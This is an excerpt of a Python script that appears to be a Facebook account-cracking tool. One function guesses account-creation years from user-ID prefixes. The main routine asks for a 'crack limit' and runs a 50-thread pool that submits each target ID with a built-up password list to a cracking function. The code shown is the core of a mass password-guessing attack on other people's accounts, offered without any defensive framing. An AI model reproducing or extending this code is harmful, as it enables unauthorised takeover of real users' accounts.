...
def abidmybrother(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :arafat = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :arafat = '√ 2009'
        elif uid[:8] in ['10000000']        :arafat = '√ 2009'
        ...
        elif uid[:6] in ['100001']          :arafat = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :arafat = '√ 2011/2012'
        elif uid[:6] in ['100004']          :arafat = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :arafat = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :arafat = '√ 2014/2015'
        elif uid[:6] in ['100009']          :arafat = '√ 2015'
        elif uid[:5] in ['10001']           :arafat = '√ 2015/2016'
        elif uid[:5] in ['10002']           :arafat = '√ 2016/2017'
        elif uid[:5] in ['10003']           :arafat = '√ 2018/2019'
        elif uid[:5] in ['10004']           :arafat = '√ 2019/2020'
        elif uid[:5] in ['10005']           :arafat = '√ 2020'
        elif uid[:5] in ['10006','10007','']:arafat = '√ 2021'
        elif uid[:5] in ['10008']           :arafat = '√ 2022'
        elif uid[:5] in ['10009']           :arafat = '√ 2023'
        else:arafat=''
...
def GHOST():
    ...
    linex()
    limit = int(input('\033[1;91m[\033[1;92m➤\033[1;91m]\033[1;97m 𝙴𝙽𝚃𝙴𝚁 𝚈𝙾??𝚁 𝙲𝚁𝙰𝙲𝙺 𝙻𝙸𝙼𝙸𝚃 \033[1;91m➤ \033[1;97m '))
    ...
    with ThreadPool(max_workers=50) as amiarafat:
        clear()
        tl = str(len(user))
        ...
        for vaiya in user:
            ...
            for Lol in Mariya:
                pwx.append(Lol)
                pwx.append(vaiya)
            amiarafat.submit(rcrack,uid,pwx,tl)
